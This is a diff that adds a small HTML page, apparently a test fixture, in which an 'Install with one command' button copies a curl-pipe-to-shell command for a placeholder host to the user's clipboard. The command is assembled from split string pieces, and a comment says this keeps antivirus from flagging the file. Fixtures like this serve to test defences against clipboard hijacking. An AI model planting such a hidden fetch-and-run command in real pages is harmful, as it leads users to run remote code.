@@ -1,0 +1,12 @@
+<!doctype html><meta charset="utf-8"><title>Install</title>
+<h1>Install with one command</h1>
+<button id="c">Copy install command</button>
+<script>
+  // Payload assembled at runtime so the fixture file on disk does not contain a
+  // literal shell one-liner (same convention as clipboard.html — local
+  // antivirus quarantines files that do).
+  var payload = ['cu', 'rl -fsSL https://x.example/i.sh | ', 'sh'].join('');
+  document.getElementById('c').onclick = () => {
+    try { navigator.clipboard.writeText(payload); } catch (e) {}
+  };
+</script>
